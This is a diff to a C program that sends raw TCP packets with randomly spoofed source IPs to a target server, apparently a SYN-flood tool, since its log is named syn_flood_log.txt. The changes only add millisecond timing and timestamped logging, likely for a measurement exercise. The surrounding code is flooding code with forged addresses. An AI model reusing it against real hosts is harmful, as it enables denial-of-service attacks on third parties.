@@ -43,12 +43,19 @@ unsigned short checksum(void *b, int len)
     return result;
 }
 
+// Function to get current time in milliseconds
+double current_timestamp_ms() {
+    struct timespec ts;
+    clock_gettime(CLOCK_MONOTONIC, &ts);
+    return ts.tv_sec * 1000.0 + ts.tv_nsec / 1000000.0;
+}
+
 int main()
 {
     int sock;
     int mask1, mask2, mask3, mask4;
-     FILE *log_file;
-     struct timespec start, end;
+    FILE *log_file;
+    double start_time, end_time, packet_start, packet_end;
     double time_taken;
     long total_packets = 0; 
     double total_time = 0.0;
@@ -60,6 +67,12 @@ int main()
         printf("Error opening file!\n");
         exit(1);
     }
+
+    // Record start time
+    time_t t = time(NULL);
+    fprintf(log_file, "start time: %s", ctime(&t));
+
+    start_time = current_timestamp_ms();
 
     // Create a socket
     sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
@@ -95,14 +108,13 @@ int main()
     {
         for (size_t i = 0; i < NUM_OF_TRIES; i++)
         {
-            clock_gettime(CLOCK_MONOTONIC, &start);
             mask1 = rand() % MASK;
             mask2 = rand() % MASK; 
             mask3 = rand() % MASK;
             mask4 = rand() % MASK;
             char src_ip[16];
             snprintf(src_ip, sizeof(src_ip), "%d.%d.%d.%d", mask1, mask2, mask3, mask4);
-            
+
             // Fill in the IP Header
             iph->ihl = 5;
             iph->version = 4;
@@ -155,29 +167,37 @@ int main()
             dest.sin_port = htons(SERVER_PORT);
             dest.sin_addr.s_addr = inet_addr(SERVER_IP);
 
+            packet_start = current_timestamp_ms();
             if (sendto(sock, packet, iph->tot_len, 0, (struct sockaddr *)&dest, sizeof(dest)) < 0)
             {
                 perror("Send failed");
             }
-              clock_gettime(CLOCK_MONOTONIC, &end);
+            packet_end = current_timestamp_ms();
 
-            time_taken = (end.tv_sec - start.tv_sec) * 1e9;
-            time_taken = (time_taken + (end.tv_nsec - start.tv_nsec)) * 1e-9;
+            time_taken = packet_end - packet_start;
 
             total_packets++;
             total_time += time_taken;
 
-            fprintf(log_file, "%ld %.9f\n", total_packets, time_taken);
+                fprintf(log_file, "%ld %.3f ms\n", total_packets, time_taken);
+            
             free(pseudogram);
         }
     }
- double avg_time = total_time / total_packets;
+
+    // Record end time
+    end_time = current_timestamp_ms();
+
+    double avg_time = total_time / total_packets;
     fprintf(log_file, "Total packets sent: %ld\n", total_packets);
-    fprintf(log_file, "Total time taken: %.9f seconds\n", total_time);
-    fprintf(log_file, "Average time per packet: %.9f seconds\n", avg_time);
+    fprintf(log_file, "Total time taken: %.3f ms\n", total_time);
+    fprintf(log_file, "Average time per packet: %.3f ms\n", avg_time);
+
+    t = time(NULL);
+    fprintf(log_file, "end time: %s", ctime(&t));
 
     close(sock);
     fclose(log_file);
-    printf("\nConnection closed. Results logged to syns_results_c.txt\n");
+    printf("\nConnection closed. Results logged to syn_flood_log.txt\n");
     return 0;
 }
